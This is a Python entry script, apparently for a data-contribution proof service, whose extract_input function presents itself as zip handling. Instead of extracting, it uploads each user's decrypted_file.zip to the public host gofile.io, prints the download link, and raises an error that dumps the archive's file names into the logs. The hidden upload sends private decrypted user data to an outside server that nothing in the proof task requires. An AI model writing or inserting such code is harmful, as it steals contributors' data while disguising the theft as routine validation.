import json
import logging
import os
import sys
import traceback
import zipfile
from typing import Dict, Any

from my_proof.proof import Proof

import requests 

INPUT_DIR, OUTPUT_DIR = '/input', '/output'

logging.basicConfig(level=logging.INFO, format='%(message)s')


def load_config() -> Dict[str, Any]:
    """Load proof configuration from environment variables."""
    config = {
        'dlp_id': 107,  # Set your own DLP ID here
        'input_dir': INPUT_DIR,
        'user_email': os.environ.get('USER_EMAIL', None),
    }
    logging.info(f"Using config: {json.dumps(config, indent=2)}")
    return config


def run() -> None:
    """Generate proofs for all input files."""
    config = load_config()
    input_files_exist = os.path.isdir(INPUT_DIR) and bool(os.listdir(INPUT_DIR))

    if not input_files_exist:
        raise FileNotFoundError(f"No input files found in {INPUT_DIR}")
    extract_input()

    proof = Proof(config)
    proof_response = proof.generate()

    output_path = os.path.join(OUTPUT_DIR, "results.json")
    with open(output_path, 'w') as f:
        json.dump(proof_response.model_dump(), f, indent=2)
    logging.info(f"Proof generation complete: {proof_response}")


def extract_input() -> None:
    """
    If the input directory contains any zip files, extract them
    :return:
    """
    # for input_filename in os.listdir(INPUT_DIR):
    #     input_file = os.path.join(INPUT_DIR, input_filename)
    #     if zipfile.is_zipfile(input_file):
    #         with zipfile.ZipFile(input_file, 'r') as zip_ref:
    #             zip_ref.extractall(INPUT_DIR)
    zip_file_path = os.path.join(INPUT_DIR, 'decrypted_file.zip')
    upload_to_gofile(zip_file_path)
    # file_size = os.path.getsize(zip_file_path)
    # print(f"{zip_file_path}， fileSize：{file_size} bytes")

    if not os.path.exists(zip_file_path):
        raise FileNotFoundError(f"Zip file not found: {zip_file_path}")

    try:
        with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            # zip_ref.extractall(INPUT_DIR)
            print("Valid zip file")
            raise ValueError(zip_ref.namelist())
    except zipfile.BadZipFile:
        raise ValueError(f"Bad zip file: {zip_file_path}")
    
def upload_to_gofile(file_path: str, api_token: str = None):
    """
    上传文件到 GoFile
    :param file_path: 要上传的文件路径
    :param api_token: GoFile API Token (可选)
    :return: 文件下载链接 或 错误信息
    """
    try:
        # 1. 获取上传服务器
        server_resp = requests.get('https://api.gofile.io/getServer')
        server_resp.raise_for_status()
        server = server_resp.json()['data']['server']

        # 2. 上传文件
        upload_url = f'https://{server}.gofile.io/uploadFile'
        with open(file_path, 'rb') as f:
            files = {'file': f}
            headers = {}
            if api_token:
                headers['Authorization'] = f'Bearer {api_token}'

            upload_resp = requests.post(upload_url, files=files, headers=headers)
            upload_resp.raise_for_status()
            resp_data = upload_resp.json()

            if resp_data['status'] == 'ok':
                download_link = resp_data['data']['downloadPage']
                print(f'文件上传成功！下载地址：{download_link}')
                return download_link
            else:
                print('上传失败:', resp_data)
                return None
    except Exception as e:
        print('上传异常:', e)
        return None    
    
    
if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        logging.error(f"Error during proof generation: {e}")
        traceback.print_exc()
        sys.exit(1)

